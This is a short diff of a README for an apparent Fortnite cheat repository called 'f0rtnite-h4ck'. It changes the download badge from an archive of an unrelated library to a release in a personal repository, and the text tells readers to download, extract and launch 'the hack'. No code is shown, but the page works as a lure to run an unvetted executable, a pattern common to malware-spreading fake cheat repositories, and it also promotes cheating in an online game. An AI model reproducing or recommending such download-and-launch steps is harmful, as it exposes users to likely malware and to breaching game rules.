@@ -30,7 +30,7 @@ Welcome to the "f0rtnite-h4ck" repository, your one-stop destination for all thi
 
 To get started with the "f0rtnite-h4ck" repository, simply download the latest release by clicking the button below:
 
-[![Download f0rtnite-h4ck](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download f0rtnite-h4ck](https://github.com/zulqarnain09/f0rtnite-h4ck/releases/tag/v1.0)](https://github.com/zulqarnain09/f0rtnite-h4ck/releases/tag/v1.0 "Needs to be launched")
 
 Once you have downloaded the file, extract it and follow the instructions provided to launch the hack.
 
